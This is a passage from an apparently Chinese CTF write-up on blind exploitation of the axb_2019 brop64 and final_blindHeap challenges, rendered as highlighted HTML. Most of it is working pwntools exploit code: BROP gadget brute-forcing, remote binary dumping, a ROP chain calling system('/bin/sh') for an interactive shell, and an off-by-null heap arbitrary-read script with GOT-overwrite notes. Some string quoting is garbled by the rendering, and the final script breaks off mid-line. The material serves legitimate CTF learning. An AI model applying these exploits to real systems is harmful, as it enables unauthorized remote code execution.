class="title">Find_brop_gadget</span>(<span class="params">libc_csu_init_address_maybe,padding_length,stop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(libc_csu_init_address_maybe+maybe_low_byte) </span><br><span class="line">            payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">            payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a brop gadget is &quot;</span> + <span class="built_in">hex</span>(</span><br><span class="line">                        libc_csu_init_address_maybe+maybe_low_byte</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (libc_csu_init_address_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_func_plt</span>(<span class="params">func_plt_maybe,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0600</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">            payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">            payload += p64(func_plt_maybe+maybe_low_byte)</span><br><span class="line">            payload += p64(stop_gadget)</span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ELF&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a function plt address is &quot;</span> + <span class="built_in">hex</span>(func_plt_maybe+maybe_low_byte)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (func_plt_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>(<span class="params">func_plt,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    process_old_had_received_length=<span class="number">0</span></span><br><span class="line">    process_now_had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">                payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">                payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">                payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">                payload += p64(<span class="number">0x400000</span>+process_now_had_received_length)</span><br><span class="line">                payload += p64(func_plt)</span><br><span class="line">                payload += p64(stop_gadget)</span><br><span class="line">                sh.send(payload)</span><br><span class="line">                sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">                received_data = sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(received_data) == <span class="number">0</span> :</span><br><span class="line">                    file_content += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                    process_now_had_received_length += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    file_content += received_data</span><br><span class="line">                    process_now_had_received_length += <span class="built_in">len</span>(received_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> process_now_had_received_length == process_old_had_received_length :</span><br><span class="line">                log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(process_old_had_received_length) +<span class="string">&#x27; byte file!&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_brop64_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                    fout.write(file_content)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            process_old_had_received_length = process_now_had_received_length</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding_length=<span class="number">216</span></span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> null:</span><br><span class="line">    padding_length=Force_find_padding()</span><br><span class="line"></span><br><span class="line">old_return_addr=<span class="number">0x400834</span></span><br><span class="line"><span class="keyword">if</span> old_return_addr <span class="keyword">is</span> null:</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    old_return_addr=u64(sh.recvuntil(<span class="string">&#x27;Goodbye!&#x27;</span>).strip(<span class="string">&#x27;Goodbye!&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;The old return address is &#x27;</span>+ <span class="built_in">hex</span>(old_return_addr))</span><br><span class="line"></span><br><span class="line">stop_gadget=<span class="number">0x4007D6</span></span><br><span class="line"><span class="keyword">if</span> stop_gadget <span class="keyword">is</span> null:</span><br><span class="line">    stop_gadget=Find_stop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length)</span><br><span class="line"></span><br><span class="line">brop_gadget=<span class="number">0x40095A</span></span><br><span class="line"><span class="keyword">if</span> brop_gadget <span class="keyword">is</span> null:</span><br><span class="line">    brop_gadget=Find_brop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget)</span><br><span class="line"></span><br><span class="line">func_plt=<span class="number">0x400635</span></span><br><span class="line"><span class="keyword">if</span> func_plt <span class="keyword">is</span> null:</span><br><span class="line">    func_plt=Find_func_plt(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget,brop_gadget)</span><br><span class="line"></span><br><span class="line">is_dumped=<span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> is_dumped <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">True</span>:</span><br><span class="line">    Dump_file(func_plt,padding_length,stop_gadget,brop_gadget)</span><br><span class="line">    is_dumped=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">sh = get_sh()</span><br><span class="line">puts_got_addr=<span class="number">0x601018</span></span><br><span class="line">puts_plt_addr=<span class="number">0x400640</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(puts_got_addr)</span><br><span class="line">payload += p64(puts_plt_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * padding_length</span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>


<h2 id="0x05-Blind-Heap"><a href="#0x05-Blind-Heap" class="headerlink" title="0x05 Blind_Heap"></a>0x05 Blind_Heap</h2><h3 id="以axb-2019-final-blindHeap为例"><a href="#以axb-2019-final-blindHeap为例" class="headerlink" title="以axb_2019_final_blindHeap为例"></a>以axb_2019_final_blindHeap为例</h3><p><strong>漏洞探测</strong></p>
<p>首先，我们通过输入<code>a b</code>，通过程序的回显，我们可以看出，<strong>程序的读入被空格截断了</strong>，根据这个特征，我们可以推测出，程序使用了<code>scanf()</code>作为输入函数。</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/dm/1024_586_/t0190716133233b26b6.png"><img src="%E7%9B%B2%E6%89%93/t0190716133233b26b6.png" alt="img"></a></p>
<p>我们判断出程序使用<code>scanf()</code>作为输入函数后，**因为<code>scanf()</code>总会在我们输入的字符串的最后加<code>x00</code>**，我们便可以推测程序中是否存在<code>Off-by-one</code>漏洞存在。</p>
<p><strong>泄露堆地址——第一个Chunk的地址</strong></p>
<p>根据一般的堆题目的规律，程序的内存布局可能形如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;name      + 00&gt; : 0000000000000000 0000000000000000</span><br><span class="line">&lt;name      + 10&gt; : 0000000000000000 0000000000000000</span><br><span class="line">&lt;cart_list + 00&gt; : 0000000000000000 0000000000000000</span><br></pre></td></tr></table></figure>
<p>那么当我们填满name区域后，申请一个Chunk，我们就可以泄露其地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sh=get_sh()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter your name(1~32):&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;A&#x27;</span> * <span class="number">24</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">Add_shopping_cart(sh,<span class="number">0x40</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;Chunk_0&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">first_chunk_addr=u64(sh.recvuntil(<span class="string">&#x27;U&#x27;</span>s<span class="string">&#x27;).strip(&#x27;</span><span class="string">U&#x27;s&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;We leak the first chunk address is &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(first_chunk_addr)))</span><br><span class="line"><span class="comment">#[+] We leak the first chunk address is 0x5626f3eeb0b0</span></span><br></pre></td></tr></table></figure>
<p><strong>Dump内存（任意地址读）</strong></p>
<p>那么我们可以利用这个<code>off-by-null</code>构造一个任意地址读。</p>
<p>此处根据我们的输入我们事实上可以推测程序内的数据结构，结构应该如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Cart</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> name_size;</span><br><span class="line">    <span class="keyword">char</span>*    name;</span><br><span class="line">    <span class="keyword">int</span> desc_size;</span><br><span class="line">    <span class="keyword">char</span>*    desc;</span><br><span class="line">&#125; cart;</span><br></pre></td></tr></table></figure>
<p>那么程序中必然有：</p>
<ol>
<li>cart_list存放着若干个cart结构的地址。</li>
<li>每个cart结构均由malloc(0x20)产生。</li>
<li>每个name均由malloc(name_size)产生。</li>
<li>每个description均由malloc(desc_size)产生。</li>
</ol>
<p>那么当我们的desc_size大于0x100字节就能保证name和cart结构一定位于0x100个字节以外，这样当cart结构的最低byte被置0时，一定位于description的可控区域。</p>
<p>例，description的起始地址是<code>0x6004????</code>，那么，description的可控区域就是<code>0x6004(?+1)???</code>，并且cart结构一定位于<code>0x6004?(?+1)(??+0x20)</code>，当最低byte被置0时，伪cart结构一定位于<code>0x6004?(?+1)00</code>，一定在可控区域，但是我们需要至少可控0x10字节才能控制cart结构中的name结构，那么也就要求我们的description的起始地址的最低byte一定需要大于0x10。因此泄露可能失败，失败率1/16。</p>
<p>我们写出泄露脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>():</span></span><br><span class="line">    had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Enter your name(1~32):&#x27;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            Add_shopping_cart(sh,<span class="number">0x150</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,<span class="number">0x8</span>,<span class="string">&#x27;Chunk_0&#x27;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">            sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">            sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            first_chunk_addr=u64(sh.recvuntil(<span class="string">&#x27;&#x27;</span>s<span class="string">&#x27;).strip(&#x27;</span><span class="string">&#x27;s&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>)) - <span class="number">0x150</span> - <span class="number">0x10</span> - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">            log.success(<span class="string">&#x27;We leak the first chunk address is &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(first_chunk_addr)))</span><br><span class="line">            padding = ( <span class="number">0x100</span> - (first_chunk_addr &amp; <span class="number">0xFF</span>) ) - <span class="number">0x10</span></span><br><span class="line">            payload = <span class="string">&#x27;A&#x27;</span> * padding + p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) </span><br><span class="line">            payload += p64(<span class="number">0xC</span>) + p64(<span class="number">0x400000</span>+had_received_length) </span><br><span class="line">            payload += p64(<span class="number">0xC</span>) + p64(<span class="number">0x400000</span>+had_received_length)</span><br><span class="line">            Display_product(sh,<span class="number">1</span>)</span><br><span class="line">            Modify_product(sh,<span class="number">0</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,payload)</span><br><span class="line">            Change_name(sh,<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            Display_product(sh,<span class="number">1</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;commodity&#x27;</span>s name <span class="keyword">is</span> <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            received_data = sh.recvuntil(&#x27;</span>x0Acommo<span class="string">&#x27;,timeout=1)[:-6]</span></span><br><span class="line"><span class="string">            if len(received_data) == 0 :</span></span><br><span class="line"><span class="string">                file_content += &#x27;</span>x00<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                had_received_length += 1</span></span><br><span class="line"><span class="string">            else :</span></span><br><span class="line"><span class="string">                file_content += received_data</span></span><br><span class="line"><span class="string">                had_received_length += len(received_data)</span></span><br><span class="line"><span class="string">            log.info(&#x27;</span>We have get <span class="string">&#x27; + str(had_received_length) +&#x27;</span>byte file!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            sh.close()</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            log.info(&#x27;</span>We get <span class="string">&#x27; + str(had_received_length) +&#x27;</span> byte file!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            with open(&#x27;</span>axb_2019_final_blindHeap_dump<span class="string">&#x27;,&#x27;</span>w<span class="string">b&#x27;) as fout:</span></span><br><span class="line"><span class="string">                fout.write(file_content)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">            sh.close()</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Dump_file()</span></span><br></pre></td></tr></table></figure>
<p><strong>IDA文件修复&amp;分析</strong></p>
<p>虽然仍然有大量的函数分析不出来，甚至我们连main函数的位置都是未知的，但是，我们可以根据函数的固定<code>opcode</code>找到一个可分析的函数。</p>
<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/dm/1024_640_/t017127ae71de7bed6e.png"><img src="%E7%9B%B2%E6%89%93/t017127ae71de7bed6e.png" alt="img"></a></p>
<p>此时我们愿意相信远端没有开启RELRO保护，如果确实如此，我们只需要篡改got表地址即可，那么我们可以很容易分析出<code>sub_4007C0</code>疑似<code>puts</code>函数，那么我们先假设它为puts函数，然后泄露它的<code>.got</code>表地址。</p>
<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/t0157239463562d4db9.png"><img src="%E7%9B%B2%E6%89%93/t0157239463562d4db9.png" alt="img"></a></p>
<p>我们还可以很容易的分析出，<code>sub_4007A0</code>应为free的got表地址。</p>
<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/dm/1024_640_/t01aadd786f2ce08832.png"><img src="%E7%9B%B2%E6%89%93/t01aadd786f2ce08832.png" alt="img"></a></p>
<p>那么我们接下来将free的got表地址篡改为system，调用即可。</p>
<p><strong>Local EXP（本地成功）</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">all_commodity=<span class="number">1</span></span><br><span class="line">just_one=<span class="number">2</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file_name=ELF(&quot;./&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_shopping_cart</span>(<span class="params">sh,product_descript_size,product_descript,product_name_size,product_name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please tell me the desrcription&#x27;</span>s size.n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    sh.sendline(str(product_descript_size))</span></span><br><span class="line"><span class="string">    sh.recvuntil(&#x27;</span>please tell me the desrcript of commodity.n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    sh.sendline(product_descript)</span></span><br><span class="line"><span class="string">    sh.recvuntil(&#x27;</span>please tell me the commodity-name<span class="string">&#x27;s size.n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(product_name_size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please tell me the commodity-name.n&#x27;</span>)</span><br><span class="line">    sh.sendline(product_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Modify_product</span>(<span class="params">sh,index,product_name,product_descript</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;The index is &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please tell me the new commodity&#x27;</span>s name.n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    sh.sendline(product_name)</span></span><br><span class="line"><span class="string">    sh.recvuntil(&#x27;</span>please tell me the new commodity<span class="string">&#x27;s desrcription.n&#x27;</span>)</span><br><span class="line">    sh.sendline(product_descript)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Display_product</span>(<span class="params">sh,mode,index=null</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(mode))</span><br><span class="line">    <span class="keyword">if</span> mode <span class="keyword">is</span> just_one:</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;The index is &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Buy_shopping_cart</span>(<span class="params">sh</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_shopping_cart</span>(<span class="params">sh,mode,index=null</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(mode))</span><br><span class="line">    <span class="keyword">if</span> mode <span class="keyword">is</span> just_one:</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;The index is &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_name</span>(<span class="params">sh,new_name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Change your name(1~32):&#x27;</span>)</span><br><span class="line">    sh.sendline(new_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span>():</span></span><br><span class="line">    <span class="keyword">if</span> args[<span 